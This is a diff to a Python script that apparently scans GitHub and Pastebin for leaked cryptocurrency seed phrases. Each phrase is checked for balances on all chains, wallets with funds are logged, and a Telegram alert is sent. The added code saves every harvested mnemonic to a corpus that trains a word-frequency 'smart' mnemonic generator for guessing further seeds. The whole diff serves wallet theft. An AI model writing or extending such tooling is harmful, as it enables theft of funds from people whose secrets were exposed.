@@ -12,6 +12,7 @@ Usage:
 
 import argparse
 import asyncio
+import json
 import logging
 import os
 import signal
@@ -51,6 +52,30 @@ logging.basicConfig(
     ],
 )
 logger = logging.getLogger("scanner")
+
+# --- Corpus persistence (leaked mnemonics → word frequency weights) ---
+CORPUS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "corpus.json")
+
+
+def _load_corpus() -> list[str]:
+    """Load leaked mnemonic corpus from disk."""
+    try:
+        with open(CORPUS_FILE, "r") as f:
+            data = json.load(f)
+            if isinstance(data, list):
+                return data
+    except (FileNotFoundError, json.JSONDecodeError):
+        pass
+    return []
+
+
+def _save_corpus(mnemonics: list[str]) -> None:
+    """Save leaked mnemonic corpus to disk."""
+    try:
+        with open(CORPUS_FILE, "w") as f:
+            json.dump(mnemonics[-5000:], f)  # Keep last 5000
+    except Exception as e:
+        logger.debug("Failed to save corpus: %s", e)
 
 
 async def send_telegram_alert(message: str) -> bool:
@@ -117,6 +142,12 @@ async def run_smart_generator_loop(interval: int = 300) -> None:
 
     analyzer = WordFrequencyAnalyzer()
     analyzer.load_from_db()
+    # Also load the live corpus from leak scanner
+    live_corpus = _load_corpus()
+    if live_corpus:
+        analyzer.analyze_corpus(live_corpus)
+        analyzer.save_to_db()
+        logger.info("Smart generator: loaded %d leaked mnemonics into corpus", len(live_corpus))
     generator = SmartMnemonicGenerator(analyzer)
 
     logger.info("Smart generator started (interval: %ds)", interval)
@@ -182,6 +213,8 @@ async def run_leak_scanner_loop(interval: int = 3600) -> None:
     from src.modules.crypto.balance.chains import ALL_CHAINS
     from src.modules.crypto.balance.hit_logger import HitLogger
 
+    from src.modules.crypto.balance.ai_analyzer import WordFrequencyAnalyzer
+
     github_token = os.environ.get("GITHUB_TOKEN", "")
     hit_logger = HitLogger(
         db_path="wallet_hits.db",
@@ -191,6 +224,15 @@ async def run_leak_scanner_loop(interval: int = 3600) -> None:
 
     github_scanner = GitHubLeakScanner(github_token=github_token, hit_logger=hit_logger)
     paste_scanner = PasteSiteScanner(hit_logger=hit_logger)
+
+    # Live corpus: load from disk, feed leaked mnemonics, persist periodically
+    corpus_mnemonics = _load_corpus()
+    analyzer = WordFrequencyAnalyzer()
+    analyzer.load_from_db()
+    if corpus_mnemonics:
+        analyzer.analyze_corpus(corpus_mnemonics)
+        analyzer.save_to_db()
+        logger.info("Loaded %d mnemonics into word frequency corpus", len(corpus_mnemonics))
 
     logger.info("Leak scanner started (interval: %ds)", interval)
 
@@ -203,11 +245,16 @@ async def run_leak_scanner_loop(interval: int = 3600) -> None:
             logger.info("Leak scanner: GitHub found %d candidates", len(github_findings))
 
             for finding in github_findings:
+                # Feed every found mnemonic to the word frequency corpus
+                if finding.mnemonic_candidate and len(finding.mnemonic_candidate.split()) >= 12:
+                    corpus_mnemonics.append(finding.mnemonic_candidate)
+                    if len(corpus_mnemonics) % 10 == 0:
+                        _save_corpus(corpus_mnemonics)
+
                 result = await verify_and_alert(
                     finding.mnemonic_candidate,
                     chains=list(ALL_CHAINS),
                     hit_logger=hit_logger,
-                    count=20,
                     source="github",
                 )
                 if result and result.has_balance:
@@ -228,11 +275,16 @@ async def run_leak_scanner_loop(interval: int = 3600) -> None:
             logger.info("Leak scanner: Pastebin found %d candidates", len(paste_findings))
 
             for finding in paste_findings:
+                # Feed every found mnemonic to the word frequency corpus
+                if finding.mnemonic_candidate and len(finding.mnemonic_candidate.split()) >= 12:
+                    corpus_mnemonics.append(finding.mnemonic_candidate)
+                    if len(corpus_mnemonics) % 10 == 0:
+                        _save_corpus(corpus_mnemonics)
+
                 result = await verify_and_alert(
                     finding.mnemonic_candidate,
                     chains=list(ALL_CHAINS),
                     hit_logger=hit_logger,
-                    count=20,
                     source="pastebin",
                 )
                 if result and result.has_balance:
